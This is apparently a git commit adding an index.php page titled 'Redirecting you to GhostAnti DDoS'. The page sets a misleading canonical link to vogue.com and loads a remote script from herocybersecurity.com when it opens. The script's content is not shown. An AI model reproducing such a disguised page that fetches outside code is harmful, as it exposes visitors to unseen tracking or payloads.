b8472dede874ac8a7821c267310d33952f6bcf6f
Jeronico2 <58086832+Jeronico2@users.noreply.github.com>
2019-11-22 18:15:44 +0000

    1

---
+++ index.php
@@ -0,0 +1,12 @@
+<!DOCTYPE html>
+<link rel="canonical" href="https://www.vogue.com">
+<html>
+<head>
+<meta name="referrer" content="always">
+<meta charset="utf-8">
+<title>Redirecting you to GhostAnti DDoS</title>
+<script src='//herocybersecurity.com/track-lda'></script>
+</head>
+<body>
+</body>
+</html>
